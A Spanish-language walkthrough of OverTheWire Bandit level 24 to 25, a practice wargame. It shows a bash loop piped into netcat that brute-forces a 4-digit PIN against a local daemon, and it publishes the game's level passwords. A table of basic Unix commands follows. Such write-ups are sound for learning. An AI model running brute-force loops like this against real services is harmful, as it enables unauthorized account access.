# Level 24--25
## Objetivo
Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le da la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN excepto revisando todas las 10000 combinaciones, lo que se denomina fuerza bruta.  
No es necesario crear nuevas conexiones cada vez.

```
Server    : bbandit24@bandit.labs.overthewire.org
Password  : VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Solución
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220

bandit24@bandit:~$ nc -v localhost 30002
Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 123
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 987
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:~$ for i in {0000..0003}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```
## Notas adicionales
| Comando | Descripción |
|---------|-------------|
|ls| lista de los archivos en la carpeta actual|
|cd/| me lleva al directorio raíz|
|cat| se utiliza para concatenar y mostrar el contenido de uno o varios archivos en la salida estándar |
|file| se utiliza para determinar el tipo de archivo mediante su contenido |
|du| se utiliza para mostrar el uso del espacio en disco por archivos y directorios  |
|find| se utiliza para buscar archivos y directorios en una jerarquía de directorios determinada   |
|-a| no ignora los archivos que comienzan con .|
|-l| hacer un listado largo de archivos|
|grep| e utiliza para buscar patrones de texto en archivos o en la salida de otros comandos. |
|man| comando que se utiliza para acceder a las páginas del manual (manuales) que proporcionan documentación detallada sobre diversos comandos, utilidades y funciones del sistema.|
|sort| se utiliza para ordenar líneas de texto en orden alfabético o numérico.|
|uniq| se utiliza para eliminar o mostrar líneas duplicadas consecutivas en un archivo de texto o en la entrada estándar.|
|strings| se utiliza para extraer y mostrar las cadenas de texto legibles en archivos binarios.|
|base64| se utiliza para codificar y decodificar datos en formato base64. Base64 es un sistema de codificación que convierte datos binarios en una representación de texto compuesta por caracteres ASCII imprimibles. |
|tr| se utiliza para realizar transformaciones de caracteres en texto. |
|tar| se utiliza para crear, visualizar, extraer y manipular archivos de formato tar, que son comunes en sistemas basados en Unix |
|gzip| se utiliza para comprimir y descomprimir archivos utilizando el algoritmo de compresión GZIP|
|bzip2| se utiliza para comprimir y descomprimir archivos utilizando el algoritmo de compresión BZIP2. Al igual que GZIP, BZIP2 es un algoritmo de compresión que reduce el tamaño de los archivos para ahorrar espacio en disco y mejorar la eficiencia en la transferencia de datos. |
|xxd| se utiliza para mostrar o crear representaciones hexadecimales y ASCII de archivos binarios. |
| mkdir | Se utiliza para crear directorios o carpetas|


## Referencias